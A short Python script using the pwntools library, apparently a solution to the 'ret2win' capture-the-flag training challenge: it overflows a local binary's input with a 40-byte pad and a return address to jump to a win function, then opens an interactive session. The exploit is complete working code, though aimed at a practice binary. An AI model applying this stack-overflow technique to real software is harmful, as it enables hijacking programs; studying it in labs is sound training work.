from pwn import *

io = process('./ret2win')

io.sendlineafter(b'> ', cyclic(40) + p64(0x400756))

io.interactive()